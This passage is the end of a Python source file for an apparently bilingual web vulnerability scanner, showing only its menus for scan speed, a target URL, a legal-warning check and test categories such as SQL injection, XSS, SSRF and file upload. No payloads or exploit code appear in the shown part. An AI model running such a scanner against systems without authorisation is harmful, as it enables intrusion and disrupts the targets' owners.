    def select_mode(self):
        """Select execution mode"""
        print("\n" + CYAN + "Select Mode / انتخاب حالت:" + Style.RESET_ALL)
        print("1. Normal (10 threads, safe delays)")
        print("2. Fast (20 threads, minimal delays)")
        print("3. Ultra Fast (50 threads, no delays)")
        
        choice = input("> ").strip()
        if choice == "2":
            self.mode = "fast"
        elif choice == "3":
            self.mode = "ultra"
        else:
            self.mode = "normal"
    
    def select_category(self):
        """Select test category"""
        print("\n" + CYAN + "Select Test Category / انتخاب دسته تست:" + Style.RESET_ALL)
        print("1. All Tests (900 tests)")
        print("2. SQL Injection (200 tests)")
        print("3. XSS (150 tests)")
        print("4. CSRF/SSRF/XXE (100 tests)")
        print("5. Security Headers (50 tests)")
        print("6. API Tests (100 tests)")
        print("7. Authentication (80 tests)")
        print("8. File Upload (60 tests)")
        print("9. Information Disclosure (60 tests)")
        print("10. Advanced (100 tests)")
        
        choice = input("> ").strip()
        
        categories = {
            '1': ['all'],
            '2': ['sql'],
            '3': ['xss'],
            '4': ['csrf_ssrf_xxe'],
            '5': ['headers'],
            '6': ['api'],
            '7': ['auth'],
            '8': ['upload'],
            '9': ['info'],
            '10': ['advanced']
        }
        
        return categories.get(choice, ['all'])
    
    def run(self):
        """Main execution flow"""
        self.show_banner()
        
        if not self.show_legal_warning():
            print(RED + "Aborted. Legal warning not accepted." + Style.RESET_ALL)
            return
        
        self.select_language()
        self.select_mode()
        
        # Get target
        print("\n" + CYAN + "Enter target URL (e.g., http://localhost:8080):" + Style.RESET_ALL)
        self.target = input("> ").strip()
        
        if not self.target:
            print(RED + "No target specified. Using http://localhost/" + Style.RESET_ALL)
            self.target = "http://localhost"
        
        # Validate target
        if not self.target.startswith('http'):
            self.target = 'http://' + self.target
        
        categories = self.select_category()
        
        # Create tester
        self.tester = SecurityTester(self.target, self.language, self.mode)
        
        # Run tests
        print("\n" + GREEN + BRIGHT + "Starting tests..." + Style.RESET_ALL)
        self.tester.run_tests(categories)
        
        print("\n" + GREEN + BRIGHT + "Testing complete!" + Style.RESET_ALL)


# ============================================================
# MAIN ENTRY POINT
# ============================================================
if __name__ == "__main__":
    try:
        app = UltimatePentest900()
        app.run()
    except KeyboardInterrupt:
        print("\n\n" + YELLOW + "Test interrupted by user." + Style.RESET_ALL)
    except Exception as e:
        print(RED + f"\nError: {e}" + Style.RESET_ALL)
